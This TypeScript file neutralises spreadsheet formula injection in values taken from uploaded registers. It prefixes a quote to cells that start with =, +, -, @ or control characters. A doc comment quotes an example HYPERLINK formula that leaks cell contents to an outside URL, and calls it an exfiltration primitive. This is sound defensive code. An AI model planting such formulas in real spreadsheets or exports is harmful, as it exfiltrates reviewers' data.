/**
 * Text that came out of a spreadsheet, on its way back to a screen.
 *
 * A cell beginning `=`, `+`, `-`, `@` or a control character is a formula to
 * Excel, LibreOffice and Google Sheets — including when the cell was filled in
 * by somebody who uploaded a register to this system and is reading the review
 * screen back. `=HYPERLINK("http://…"&A1)` in a name column is an exfiltration
 * primitive that costs nothing to plant and works the moment a reviewer exports
 * their conflict list.
 *
 * So values that came from a file are neutralised on the way *out*, never on the
 * way in. The stored row keeps exactly what the register said, because that is
 * the evidence a reviewer is being asked to judge; what changes is that no
 * downstream spreadsheet will execute it.
 */

/** The lead characters a spreadsheet treats as the start of a formula. */
const FORMULA_LEADS = new Set(['=', '+', '-', '@', '\t', '\r', '\n'])

/**
 * Renders one value from an uploaded file as inert text.
 *
 * Prefixes a single quote, which every spreadsheet reads as "this is text" and
 * every human reads as a quote mark — visible, rather than a silent deletion
 * that would make a reviewer wonder why a name looks wrong.
 */
export function neutralizeSpreadsheetText(value: string): string {
  const first = value[0]
  if (first !== undefined && FORMULA_LEADS.has(first)) return `'${value}`
  return value
}

/** The same, for a value that may be absent. */
export function neutralizeOptional(value: string | null | undefined): string | null {
  if (value === null || value === undefined) return null
  return neutralizeSpreadsheetText(value)
}
